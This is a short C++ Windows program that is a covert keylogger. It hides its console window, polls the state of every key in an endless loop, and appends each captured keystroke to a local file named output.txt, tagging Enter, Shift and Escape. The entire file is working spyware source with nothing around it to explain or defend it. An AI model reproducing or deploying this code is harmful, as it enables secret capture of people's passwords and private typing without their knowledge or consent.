#include <iostream>
#include <Windows.h>
using namespace std;

void saveToFile(const char *filename, int key){
	FILE *output;
	output=fopen(filename,"a+");
	if(key==VK_RETURN) fprintf(output,"%s"," {ENTER} ");
	else if (key==VK_SHIFT) fprintf(output,"%s"," {SHIFT} ");
	else if(key==VK_ESCAPE) fprintf(output,"%s"," {ESCAPE} ");
	else fprintf(output,"%s",&key);
	fclose(output);
}

int main()
{
	FreeConsole();
	while(true){
		for(int i = 8; i<=255;i++){
			if(GetAsyncKeyState(i) == -32767) saveToFile("output.txt",i);
			}
		}
  return 0;
}
